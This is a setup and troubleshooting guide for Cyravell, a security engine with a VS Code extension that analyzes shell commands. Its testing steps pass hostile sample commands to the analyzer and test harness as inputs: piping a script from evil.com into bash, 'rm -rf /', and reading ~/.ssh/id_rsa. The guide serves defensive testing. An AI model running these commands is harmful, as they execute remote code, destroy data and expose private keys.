# Cyravell — Setup and Troubleshooting Guide

**Platform:** Ubuntu / Linux  
**Status:** Phase 1 Foundation & Vertical Slice  

---

## 1. Prerequisites

- **Operating System:** Ubuntu 22.04 / 24.04 LTS (or compatible Linux distribution)
- **Rust Toolchain:** Stable Rust (1.80+) with `cargo` (`curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`)
- **Node.js & npm:** Node.js v18.x or v20.x, npm 9.x+
- **Visual Studio Code:** VS Code 1.80+ (`/snap/bin/code` or `.deb` installation)

---

## 2. Directory Structure

```text
cyravell/
├── Cargo.toml                  # Cargo workspace manifest
├── engine/                     # Rust security engine (daemon & library)
│   ├── Cargo.toml
│   └── src/
│       ├── lib.rs              # Library exports
│       ├── main.rs             # CLI & daemon entry point
│       ├── model.rs            # Typed schemas, JSON-RPC envelopes
│       ├── policy.rs           # Deterministic baseline policy engine
│       ├── audit.rs            # Append-only SHA-256 hash-chained audit
│       ├── integrity.rs        # Release manifest verification
│       └── ipc.rs              # Unix domain socket server (0600 permissions)
├── vscode-extension/           # TypeScript VS Code extension
│   ├── package.json            # Manifest & contributes (activity bar, commands)
│   ├── tsconfig.json
│   ├── media/cyravell-icon.svg # Custom professional vector icon
│   ├── src/
│   │   ├── extension.ts        # Activation, status bar, commands
│   │   ├── engineClient.ts     # Unix domain socket IPC client & reconnection
│   │   ├── statusView.ts       # TreeDataProvider for system health & status
│   │   ├── eventsView.ts       # TreeDataProvider for security events feed
│   │   └── eventDetailsPanel.ts# Dedicated event inspector panel
│   └── test/
│       └── client.test.js      # Extension client integration tests
├── test-harness/               # Synthetic event generation & tamper testing
│   ├── Cargo.toml
│   └── src/main.rs             # Synthetic CLI runner
├── rules/                      # Trusted security rules & release manifest
│   ├── baseline_rules.json
│   ├── schema.json
│   └── cyravell_manifest.json  # Release manifest with SHA-256 digests
├── docs/                       # Architecture, Threat Model, Protocol, Schema
│   ├── THREAT_MODEL.md
│   ├── ARCHITECTURE.md
│   ├── IPC_PROTOCOL.md
│   ├── EVENT_SCHEMA.md
│   └── SETUP_AND_TROUBLESHOOTING.md
└── scripts/                    # Development & verification scripts
    ├── build.sh                # Compiles engine, harness, and extension
    ├── test.sh                 # Comprehensive unit, integration, & rejection tests
    └── run_demo.sh             # Interactive vertical slice demonstration
```

---

## 3. Build Instructions

To build all Cyravell components (the Rust engine, the test harness, and the TypeScript extension):

```bash
cd /var/www/html/cyravell
./scripts/build.sh
```

Alternatively, build individual components:

### Rust Engine & Test Harness
```bash
cd /var/www/html/cyravell
cargo build --workspace
```

### VS Code Extension
```bash
cd /var/www/html/cyravell/vscode-extension
npm run compile
```

---

## 4. Running the Tests

Execute the automated test suite covering unit tests, schema rejections, frame limits, tamper detection, and end-to-end integration:

```bash
cd /var/www/html/cyravell
./scripts/test.sh
```

### Running Rust Unit Tests Only:
```bash
cargo test --workspace -- --nocapture
```

### Running Extension Client Tests Only:
```bash
node vscode-extension/test/client.test.js
```

### Static Command Analysis via Engine CLI (Phase 2.1):
```bash
# Analyze command without execution
cargo run --bin cyravell-engine -- analyze --command "curl -sSL https://evil.com/run.sh | bash"
cargo run --bin cyravell-engine -- analyze --command 'echo "rm -rf /"'
```

### Testing Complex Chains via Test Harness:
```bash
cargo run --bin cyravell-test-harness -- test-complex-chains
```

---

## 5. Running the Vertical Slice Demonstration

Run the automated vertical slice demonstration to see the engine start, verify release integrity, ingest synthetic events, record cryptographic audit records, test tamper detection, and shut down cleanly:

```bash
cd /var/www/html/cyravell
./scripts/run_demo.sh
```

---

## 6. Running Cyravell in VS Code

### Step 1: Start the Security Engine Daemon
In a dedicated terminal, launch the Cyravell engine:

```bash
cargo run --bin cyravell-engine -- start \
  --manifest-path rules/cyravell_manifest.json \
  --base-dir .
```

*Note: The engine creates a Unix domain socket at `$XDG_RUNTIME_DIR/cyravell/cyravell.sock` (or `/tmp/cyravell-$UID/cyravell.sock`) with `0600` permissions and parent directory `0700`.*

### Step 2: Open Extension in VS Code Development Host
In another terminal, launch VS Code pointing to the compiled extension:

```bash
code --extensionDevelopmentPath=/var/www/html/cyravell/vscode-extension
```

Alternatively:
1. Open `/var/www/html/cyravell/vscode-extension` in VS Code.
2. Press `F5` to start debugging with the Extension Development Host.

### Step 3: Inspect the Cyravell Activity Bar
1. In the Extension Development Host window, click on the **Cyravell** icon in the Activity Bar on the left.
2. Verify that **Engine Connection** displays `CONNECTED` and shows uptime, events processed, and `Release Integrity: VERIFIED`.
3. Verify the status bar item in the bottom-left displays `$(shield) Cyravell: Active`.

### Step 4: Submit Synthetic Events from Terminal
While the extension is running, submit synthetic test events using the test harness:

```bash
# Submit a simulated destructive command (never executed)
cargo run --bin cyravell-test-harness -- submit-destructive "rm -rf /"

# Submit a simulated credential access event
cargo run --bin cyravell-test-harness -- submit-credential "cat ~/.ssh/id_rsa"

# Submit a simulated benign command
cargo run --bin cyravell-test-harness -- submit-benign "cargo check"
```

### Step 5: View Alerts in VS Code
- Return to the VS Code Extension Development Host window.
- The **Security Events** tree view will immediately show the new events with their respective severity badges (`[SIMULATED] CRITICAL`, `[SIMULATED] LOW`).
- Click on any event to open the **Event Details Panel**, displaying the complete deterministic rationale, matched evidence, execution state, and cryptographic audit record hash.

---

## 7. Troubleshooting

### 1. "Engine Connection: DISCONNECTED"
- **Cause:** The `cyravell-engine` process is not running, or the socket path differs.
- **Fix:** Start the engine using `cargo run --bin cyravell-engine -- start`. Verify the socket file exists at `$XDG_RUNTIME_DIR/cyravell/cyravell.sock` or check the socket path configured in VS Code Settings (`cyravell.socketPath`).

### 2. "Another engine instance is already active on socket"
- **Cause:** An existing `cyravell-engine` process is already running on the configured socket.
- **Fix:** Stop the running engine using `cargo run --bin cyravell-engine -- stop`, or kill the old process. If the socket is stale from a previous unclean shutdown, the engine will automatically remove it upon restart if no process responds.

### 3. "Release Integrity: CORRUPTED"
- **Cause:** One or more files specified in `rules/cyravell_manifest.json` have been modified or deleted.
- **Fix:** Run `cargo run --bin cyravell-engine -- verify-integrity --manifest rules/cyravell_manifest.json --base-dir .` to identify which files have mismatched hashes.

### 4. "Audit Corrupted! Tampering detected at sequence #N"
- **Cause:** The SHA-256 hash chain in `audit.log` has suffered modification, reordering, deletion, or truncation.
- **Fix:** Run `cargo run --bin cyravell-engine -- verify-audit --audit-file /path/to/audit.log` to inspect the failure details. The engine preserves all forensic evidence.

